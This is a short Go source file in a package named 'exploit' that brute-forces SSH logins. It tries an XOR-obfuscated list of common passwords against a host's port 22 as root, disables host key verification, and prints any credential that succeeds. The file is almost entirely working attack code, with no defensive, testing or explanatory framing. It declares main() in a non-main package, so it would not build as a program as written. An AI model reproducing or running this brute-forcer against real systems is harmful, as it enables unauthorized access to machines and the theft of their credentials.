package exploit

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"net"
	"time"
)

func obfuscate_password(password string) string {
	key := byte(0xAB)
	obfuscated := []byte(password)
	for i := range obfuscated {
		obfuscated[i] ^= key
	}
	return string(obfuscated)
}

func deobfuscate_password(password string) string {
	return obfuscate_password(password)
}

func ssh_brute_force(ip string, username string, obfuscated_passwords []string) (*ssh.Client, error) {
	for _, obfuscated_password := range obfuscated_passwords {
		password := deobfuscate_password(obfuscated_password)

		config := &ssh.ClientConfig{
			User: username,
			Auth: []ssh.AuthMethod{
				ssh.Password(password),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         5 * time.Second,
		}

		client, err := ssh.Dial("tcp", net.JoinHostPort(ip, "22"), config)
		if err == nil {
			fmt.Printf("[+] Password found: %s@%s - %s\n", username, ip, password)
			return client, nil
		}
	}
	return nil, fmt.Errorf("no valid password found for %s@%s", username, ip)
}

func main() {
	ip := "192.168.1.100" //example
	passwords := []string{
		obfuscate_password("password123"), //example
		obfuscate_password("admin"), //example
		obfuscate_password("root"), //example
	}
	client, err := ssh_brute_force(ip, "root", passwords)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer client.Close()
}
